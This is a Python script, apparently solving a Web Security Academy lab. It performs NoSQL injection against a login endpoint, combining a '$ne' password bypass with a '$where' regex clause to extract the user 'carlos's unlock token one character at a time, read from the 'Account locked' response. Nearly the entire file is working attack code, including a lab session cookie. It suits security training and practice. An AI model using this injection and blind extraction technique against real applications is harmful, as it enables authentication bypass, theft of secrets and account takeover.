import requests

url = "https://0ae700ca034aa036819b61b3002d0062.web-security-academy.net/login"

headers = {
    "Host": "0ae700ca034aa036819b61b3002d0062.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Referer": "https://0ae700ca034aa036819b61b3002d0062.web-security-academy.net/login",
    "Content-Type": "application/json",
    "Origin": "https://0ae700ca034aa036819b61b3002d0062.web-security-academy.net",
    "Connection": "keep-alive",
    "Cookie": "session=7HWOHkj3DG6u8lN3m4yNbF7zz5AjAkgv",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=0"
}

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

token = ""

for char_pos in range(20):
    for char in charset:
        payload = {
            "username": "carlos",
            "password": {"$ne": "invalid"},
            "$where": f"this.unlockToken.match('^{token}{char}.*')"
        }

        response = requests.post(url, json=payload, headers=headers)

        if "Account locked" in response.text:
            token += char
            print(f"Token[{char_pos}]: {token}")
            break
    else:
        break

print("\nToken:", token)
